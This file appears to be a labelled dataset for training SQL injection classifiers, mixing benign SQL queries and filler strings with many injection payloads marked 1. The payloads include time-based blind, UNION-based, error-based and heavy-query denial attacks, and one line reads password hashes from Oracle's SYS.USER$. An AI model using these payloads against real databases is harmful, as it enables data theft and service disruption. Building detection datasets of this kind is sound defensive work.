Query,Label
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf",1
1   )    )    as muyz where 6105  =  6105,1
SELECT * FROM control WHERE remain IN  ( SELECT morning FROM blue ) ,0
SELECT AVG ( accurate ) FROM keep SELECT SUM ( knife ) ,0
29691,0
"  SELECT frozen AS pen, seat AS [mistake]  FROM standard",0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'ahjo'  =  'ahjo",1
halpin,0
"SELECT * FROM baseball WHERE elephant BETWEEN ""suppose"" AND    ""gas""",0
SELECT * FROM off WHERE motion = 'no',0
"  SELECT leafID AS ID, date AS position FROM love",0
ridgely.loyat@cbgerindote.sk,0
"-4983%""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'gmbd'  =  'gmbd",1
SELECT * FROM wood 3,0
2.78171E+15,0
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
"torre de esteban hambrn, la",0
SELECT COUNT ( keep )  FROM musical,0
"1 where 4331  =  4331 union all select null,null,null,null,null,null#",1
SELECT AVG ( Price ) FROM sun,0
1'||  (  select 'npel' from dual where 5258  =  5258,1
chuck,0
1'   )    )    as yqcl where 5026  =  5026 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
"-3609""   )    )    as fzyp where 9474  =  9474 or 9323  =  9323#",1
SELECT TOP 3 * FROM enter SELECT * FROM social 3SELECT * FROM water,0
90660924f,0
"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM walk WHERE poetry NOT LIKE '[television]%',0
"  SELECT * FROM tide WHERE pie IN  ( 'particles', 'count', 'knife' )  ",0
"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",1
47608,0
SELECT whispered ( s )  FROM care UNION ALL,0
"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
16610,0
bodo,0
SELECT MIN ( produce )  AS boy FROM donkey,0
"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
5.10E+15,0
masegosa,0
 select * from information_schema.tables--,1
SELECT * FROM way WHERE vertical NOT LIKE 'member%',0
FROM  ( SELECT DISTINCT choice FROM event ) ,0
"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1
desiree,0
SELECT TOP 50 PERCENT * FROM particularly,0
69320452q,0
07951538r,0
SELECT * FROM upward WHERE pale = 'structure' FETCH FIRST 3 ROWS ONLY,0
as,1
retiendas,0
wooland@indagacion.td,0
 UPDATE riding SET piano = 'perfectly'WHERE peace = 'such',0
"-9208%""   )    )    or 8571  =  8571--",1
select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,1
"calle sobrerroca 96, 7?f",0
SELECT * FROM truth 3,0
"-3349   )    )     )   union all select 6553,6553#",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
"  SELECT out AS fence, good AS [quietly]  FROM who",0
SELECT * FROM worry ORDER BY several,0
"1""   )    )     )   rlike   (  select   (  case when   (  7975  =  2446  )   then 1 else 0x28 end   )    )    and    (    (     (  ""qixm"" like ""qixm",1
33814848h,0
"INSERT INTO onto ( bite, slope, refer, duck, draw, rock )  VALUES  ( 'fight', 'needs'. motion', 'else', 'tribe', 'bark', 'another' )  ",0
fraser,0
SELECT * FROM stand FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT due ( s ) FROM outline INNER JOIN,0
waitfor delay '0:0:5' and    (    (     (  '%'  =  ',1
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
1  )   as lisg where 5490  =  5490,1
SELECT * FROM frozen WHERE grain = 'car'  AND  ( joined = 'wherever' OR month = 'sight' ) ,0
"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",1
verrilli,0
1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,1
SELECT * FROM review WHERE torn IN  ( SELECT service FROM invented ) ,0
SELECT * FROM paint WHERE spite NOT BETWEEN 'eye' AND 'giving',0
SELECT COUNT ( noseID ) FROM fastened,0
3.62194E+15,0
85233754d,0
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dqis""  =  ""dqis",1
"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
consell,0
SELECT AVG ( floor ) FROM safe SELECT SUM ( desk ) ,0
"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",1
rini,0
SELECT Count ( * )  AS fairly,0
SELECT COUNT ( pride ) FROM adjective,0
SELECT COUNT ( everyone ) FROM color,0
SELECT COUNT ( value )  FROM tea,0
buenda,0
1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',1
SELECT * FROM policeman WHERE property  BETWEEN 10 AND 20,0
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",1
"1""  )   where 5698  =  5698 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",1
SELECT AVG ( describe ) FROM cat,0
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud,0
"1'  )   as ycsr where 2238  =  2238 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM attention WHERE task  BETWEEN 10 AND 20,0
"1""   )    )   ",1
SELECT * FROM anyway WHERE master = 'title',0
"  SELECT * FROM sometime WHERE pan IN  ( 'slowly', 'climate', 'dangerous' )  ",0
SELECT * FROM combine WHERE happen BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT my,spoken FROM record WHERE music = 'cross' UNION SELECT lion, make FROM tight",0
"c/ alcaices, 23",0
"1%'   )    )    union all select null,null,null,null,null,null,null--",1
SELECT TOP 50 PERCENT * FROM noise,0
"  SELECT improveID AS ID, attack AS eager FROM prevent",0
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
"   SELECT COUNT ( by ) , trap FROM somebody BY community",0
7.84149E+15,0
1 where 8966  =  8966,1
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1
"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",1
DELETE FROM wrong WHERE picture = 'dinner',0
SELECT * FROM rubbed FETCH FIRST 3 ROWS ONLY,0
gina,0
"  SELECT vapor AS flew, dog AS [cent]  FROM her",0
SELECT * FROM fix  WHERE noon NOT LIKE '[cent]%',0
misio+nal,0
"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '",1
" SELECT * FROM Products WHERE Price BETWEEN 10 AND 20 AND CategoryID NOT IN  ( 1,2,3 ) ;",0
SELECT COUNT ( DISTINCT six )  FROM enemy,0
SELECT * FROM compass 3 SELECT * FROM mood,0
-2625'   )    )    or 3038  =  3038,1
SELECT * FROM  ( SELECT broad FROM pig ) ,0
SELECT * FROM belong WHERE tight = 'bow' FETCH FIRST 3 ROWS ONLY,0
-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,1
"SELECT * FROM announced WHERE health BETWEEN ""yourself"" AND    ""that""",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 189 )  ORDER BY meta_id ASC",0
SELECT scientific ( s )  FROM term UNION ALL,0
SELECT * FROM below WHERE fill NOT LIKE 'situation%',0
SELECT * FROM threw WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0
"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
"-3279"" union all select 8568,8568,8568,8568--",1
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""sajl""  =  ""sajl",1
SELECT COUNT ( excellent )  FROM dropped,0
"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT DISTINCT lovely FROM continued,0
lamentante,0
08zaril0o,0
"iif  (  3447  =  1084,1,1/0  )  ",1
bacio bonnin,0
SELECT * FROM food WHERE lips NOT BETWEEN 'ordinary' AND 'mix',0
"  SELECT forgot,becoming,health FROM bag LEFT JOIN Orders ON island.experienceID =  cast.keep ORDER BY dream.reach",0
SELECT * FROM strong WHERE event = 'obtain'  OR phrase = 'daughter',0
"  SELECT oil,airplane,wool FROM term LEFT JOIN Orders ON shop.nutsID =  in.whenever ORDER BY held.wish",0
"  UPDATE lying SET found =  'quickly', City =  'highest' WHERE clean =  sunlight",0
SELECT AVG ( however ) FROM hung,0
‘ or 3  =  3 --,1
25727,0
"1""  )   where 4426  =  4426 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"  UPDATE driven SET become =  'given', City =  'whispered' WHERE silence =  pool",0
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1
calafell palmieri,0
"-5210""  )   where 7176  =  7176 or 6872  =  6872--",1
 or 'whatever' in   (  'whatever'  ) ,1
SELECT COUNT ( activityID ) FROM ready,0
"1  )   where 5073  =  5073 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"  SELECT Orders.towerrID, Employees.them, Employees.its FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.exactlyID ORDER BY Orders.valleyID",0
49718,0
koock@aridossanchez.mt,0
SELECT * FROM serious FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM few,0
SELECT girl ( s )  FROM oxygen SELECT smoke FROM support,0
"1"" where 1765  =  1765 union all select null,null,null,null,null,null#",1
"1""  )   where 5814  =  5814 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'clhg'  =  'clhg",1
"-7514%""   )    )     )   or 2448  =  8797#",1
"1%""   )    )    union all select null,null,null,null,null,null,null#",1
-9562' or 8571  =  8571--,1
SELECT * FROM beside ORDER BY yesterday,0
"SELECT RPAD ( ""SQL Tutorial"",   20, ""ABC"" ) ;",0
3.89386E+15,0
chilln,0
SELECT * FROM boy 3,0
8328,0
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""vkqt""  =  ""vkqt",1
SELECT depth FROM simple UNION SELECT stared FROM horse ORDER BY thought,0
aira vials,0
"-8200' in boolean mode  )   union all select 3360,3360--",1
20491,0
SELECT * FROM parts WHERE pond = 'joy'  AND City = 'cell',0
"waitfor delay '0:0:5' and    (    (   ""%""  =  """,1
SELECT AVG ( coffee ) FROM club,0
SELECT * FROM scientific WHERE year NOT BETWEEN 'where' AND 'yard',0
talens zumalacrregui,0
SELECT branch FROM basic,0
"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",1
SELECT * FROM built WHERE hard LIKE '%lay%',0
34260,0
empeine,0
"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",1
addons,0
"   SELECT point, man, pinkFROM jungle WHERE canal  IS NOT NULL",0
"1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT wall ( s )  FROM managed FULL OUTER JOIN,0
tenuta,0
sobrecejo,0
SELECT * FROM greater WHERE Price NOT BETWEEN 10 AND 20,0
"1   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM party WHERE same NOT BETWEEN 'did' AND 'those',0
1'  )   as rvli where 4427  =  4427,1
SELECT * FROM fifteen WHERE stopped = 'rising' LIMIT 3,0
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",1
p6lma13isti,0
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",1
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""blkt"" like ""blkt",1
SELECT * FROM brother WHERE occasionally = 'visitor' LIMIT 3,0
.bronceada,0
SELECT COUNT ( question ) FROM produce,0
"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
8547,0
SELECT TOP 50 PERCENT * FROM compound,0
476en9o9na5,0
"-2222' in boolean mode  )   union all select 7649,7649,7649,7649,7649,7649,7649,7649--",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82a3dbb22' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
1'   )    )    as sjzf where 9997  =  9997 and 4193  =  5408,1
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * FROM night 3,0
"1""  )   where 1330  =  1330 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1
benalup-casas viejas,0
1'   )    )    as dago where 9788  =  9788,1
guell lloret,0
SELECT * FROM farmer WHERE replace = 'split' FETCH FIRST 3 ROWS ONLY,0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",1
select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
2.30E+15,0
"  SELECT dropID AS ID, four AS importance FROM low",0
SELECT AVG ( elephant ) FROM cheese SELECT SUM ( individual ) ,0
SELECT * FROM lower FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM fear,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 177 )  ORDER BY meta_id ASC",0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
SELECT AVG ( Price )  FROM Products;,0
"   SELECT balance, order, roadFROM hospital WHERE muscle  IS NOT NULL",0
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1
-6412%' or 4065  =  5815 and '%'  =  ',1
"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",1
"1%""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT   NOW (  )  + 1;,0
1'  )   as gogu where 4338  =  4338 union all select null#,1
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",1
"1"" where 8234  =  8234",1
"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
palls de buran,0
-1468'   )    )     )   or 4875  =  6163#,1
"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1
49699,0
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",1
